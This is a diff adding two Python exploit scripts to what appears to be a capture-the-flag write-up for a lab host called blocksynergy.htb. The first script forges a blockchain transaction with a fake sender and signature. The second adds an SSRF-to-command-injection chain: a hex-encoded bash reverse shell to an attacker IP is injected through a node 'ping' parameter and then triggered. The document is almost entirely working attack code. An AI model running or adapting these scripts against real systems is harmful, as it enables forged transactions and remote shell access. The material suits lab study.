@@ -35,3 +35,312 @@ Nmap done: 1 IP address (1 host up) scanned in 10.57 seconds
 ```
 
 
+
+``` py
+
+import requests
+import json
+
+url = "http://blocksynergy.htb:8080"
+
+s = requests.Session()
+
+def load_wallet():
+
+      data = {
+
+       "action":"create",
+       "filename":"wallet"
+
+      }
+
+      try:
+
+          r = s.post(url + "/dashboard/wallet", data=data, timeout=10)
+          print(f"[+] Create wallet: {r.status_code}")
+          wallet = r.json()
+          public_key = wallet["public_key"]
+
+      except requests.exceptions.Timeout:
+
+                   print("[-] Error: Timeout")
+
+      except requests.exceptions.ConnectionError:
+
+                   print("[-] Error: Can't connect to the server")
+
+      except Exception as e:
+
+                   print(f"[-] Error: {e}")
+
+      file = {
+
+        "file": ("wallet.json", json.dumps(wallet), "application/json")
+      }
+
+      try:
+
+          r = s.post(url + "/dashboard/wallet", data={"action":"load"}, files=file, timeout=10)
+
+          cookie = s.cookies.get("session")
+          if cookie:
+
+                    print(f"[+] Cookie:{cookie}")
+
+                    try:
+
+                        r = s.get(url + "/dashboard/info")
+                        if "no wallet load" in r.text:
+
+                                 print("[-] No wallet load")
+
+                        else:
+                                 print("[+] wallet load succesfully")
+
+                    except Exception as e:
+
+                             print(f"[-] Error: {e}")
+
+      except requests.exceptions.Timeout:
+
+               print("[-] Error: Timeout")
+
+      except requests.exceptions.ConnectionError:
+
+               print("[-] Error: Can't connect to the server")
+
+      except Exception as e:
+
+               print(f"[-] Error: {e}")
+
+      return public_key
+
+def broadcast_transaction(public_key):
+
+     data = {
+
+        "receiver":public_key,
+        "sender":"pwned",
+        "amount":100,
+        "signature":"pwned"
+
+     }
+
+     try:
+
+         r = s.post(url + "/broadcast_transaction", json=data, timeout=10)
+         print(f"[+] Broadcast_transaction status code: {r.status_code}")
+         print(f"[+] Response broadcast_transaction: {r.text}")
+
+     except requests.exceptions.Timeout:
+
+              print("[-] Error: Timeout")
+
+     except requests.exceptions.ConnectionError:
+
+              print("[-] Error: Can't connect to the server")
+
+     except Exception as e:
+
+              print(f"[-] Error: {e}")
+
+if __name__ == "__main__":
+
+          public_key = load_wallet()
+          broadcast_transaction(public_key)
+
+
+```
+
+
+``` py
+
+
+import requests
+import json
+import time
+
+url = "http://blocksynergy.htb:8080"
+
+s = requests.Session()
+
+def load_wallet():
+
+      data = {
+
+       "action":"create",
+       "filename":"wallet"
+
+      }
+
+      try:
+
+          r = s.post(url + "/dashboard/wallet", data=data, timeout=10)
+          print(f"[+] Create wallet: {r.status_code}")
+          wallet = r.json()
+          public_key = wallet["public_key"]
+
+      except requests.exceptions.Timeout:
+
+                   print("[-] Error: Timeout")
+
+      except requests.exceptions.ConnectionError:
+
+                   print("[-] Error: Can't connect to the server")
+
+      except Exception as e:
+
+                   print(f"[-] Error: {e}")
+
+      file = {
+
+        "file": ("wallet.json", json.dumps(wallet), "application/json")
+      }
+
+      try:
+
+          r = s.post(url + "/dashboard/wallet", data={"action":"load"}, files=file, timeout=10)
+
+          cookie = s.cookies.get("session")
+          if cookie:
+
+                    print(f"[+] Cookie:{cookie}")
+
+                    try:
+
+                        r = s.get(url + "/dashboard/info")
+                        if "no wallet load" in r.text:
+
+                                 print("[-] No wallet load")
+
+                        else:
+                                 print("[+] wallet load succesfully")
+
+                    except Exception as e:
+
+                             print(f"[-] Error: {e}")
+
+      except requests.exceptions.Timeout:
+
+               print("[-] Error: Timeout")
+
+      except requests.exceptions.ConnectionError:
+
+               print("[-] Error: Can't connect to the server")
+
+      except Exception as e:
+
+               print(f"[-] Error: {e}")
+
+      return public_key
+
+def broadcast_transaction(public_key):
+
+     data = {
+
+        "receiver":public_key,
+        "sender":"pwned",
+        "amount":100,
+        "signature":"pwned"
+
+     }
+
+     try:
+
+         r = s.post(url + "/broadcast_transaction", json=data, timeout=10)
+         print(f"[+] Broadcast_transaction status code: {r.status_code}")
+         print(f"[+] Response broadcast_transaction: {r.text}")
+
+     except requests.exceptions.Timeout:
+
+              print("[-] Error: Timeout")
+
+     except requests.exceptions.ConnectionError:
+
+              print("[-] Error: Can't connect to the server")
+
+     except Exception as e:
+
+              print(f"[-] Error: {e}")
+
+
+def ssrf_rce():
+
+     LHOST = "10.10.14.138"
+     LPORT = "443"
+
+     cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
+     cmd_hex = cmd.encode().hex()
+
+     payload_cmd = f"echo {cmd_hex}|xxd -r -p|bash"
+
+     target = f"http://x;{payload_cmd};/"
+     node_url = f"http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target={target}"
+
+     try:
+         data = {
+
+         "action": "register", "node": node_url
+
+         }
+
+         while True:
+
+                    r = s.post(url + "/dashboard/vip/nodes", data=data, timeout=10)
+
+                    nodes = s.get(url + "/nodes", timeout=10).json()
+
+                    url_node = nodes[-1]
+                    node_id = len(nodes) - 1
+
+                    if url_node == data["node"]:
+                            print(f"[+] Node ID: {node_id}")
+
+                            break
+
+                    print("[-] No ID found")
+
+                    time.sleep(1)
+
+
+     except requests.exceptions.Timeout:
+
+              print("[-] Error: Timeout")
+
+     except requests.exceptions.ConnectionError:
+
+              print("[-] Error: Can't connect to the server")
+
+     except Exception as e:
+
+              print(f"[-] Error: {e}")
+
+     try:
+
+         r = s.get(url + f"/dashboard/vip/nodes/test_node/{node_id}", timeout=10)
+         print(f"[+] Payload executed: {r.status_code}")
+         print("[+] Check your listener")
+
+     except requests.exceptions.Timeout:
+
+              print("[-] Error: Timeout")
+
+     except requests.exceptions.ConnectionError:
+
+              print("[-] Error: Can't connect to the server")
+
+     except Exception as e:
+
+              print(f"[-] Error: {e}")
+
+
+
+if __name__ == "__main__":
+
+          public_key = load_wallet()
+          broadcast_transaction(public_key)
+          ssrf_rce()
+
+
+```
+
